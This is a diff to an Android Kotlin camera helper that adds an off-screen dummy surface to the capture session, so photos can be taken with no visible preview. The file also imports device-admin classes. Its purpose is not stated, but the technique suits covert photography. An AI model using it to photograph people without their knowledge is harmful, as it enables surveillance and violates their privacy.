@@ -5,6 +5,7 @@ import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.graphics.ImageFormat
+import android.graphics.SurfaceTexture
 import android.hardware.camera2.CameraAccessException
 import android.hardware.camera2.CameraCaptureSession
 import android.hardware.camera2.CameraCharacteristics
@@ -17,6 +18,7 @@ import android.os.HandlerThread
 import android.os.Looper
 import android.util.Base64
 import android.util.Size
+import android.view.Surface
 import com.example.receiver.MyDeviceAdminReceiver
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
@@ -78,6 +80,11 @@ class CameraHelper(private val context: Context) {
             ?: jpegSizes?.firstOrNull()
             ?: Size(640, 480)
 
+        val dummySurfaceTexture = SurfaceTexture(10).apply {
+            setDefaultBufferSize(captureSize.width, captureSize.height)
+        }
+        val dummySurface = Surface(dummySurfaceTexture)
+
         val imageReader = ImageReader.newInstance(captureSize.width, captureSize.height, ImageFormat.JPEG, 2)
         val latch = CountDownLatch(1)
         var capturedBytes: ByteArray? = null
@@ -118,7 +125,7 @@ class CameraHelper(private val context: Context) {
                             set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                             set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                         }
-                        camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
+                        camera.createCaptureSession(listOf(imageReader.surface, dummySurface), object : CameraCaptureSession.StateCallback() {
                             override fun onConfigured(session: CameraCaptureSession) {
                                 captureSession = session
                                 try {
@@ -165,6 +172,8 @@ class CameraHelper(private val context: Context) {
             try { captureSession?.close() } catch (_: Exception) {}
             try { cameraDevice?.close() } catch (_: Exception) {}
             try { imageReader.close() } catch (_: Exception) {}
+            try { dummySurface.release() } catch (_: Exception) {}
+            try { dummySurfaceTexture.release() } catch (_: Exception) {}
         }
     }
 
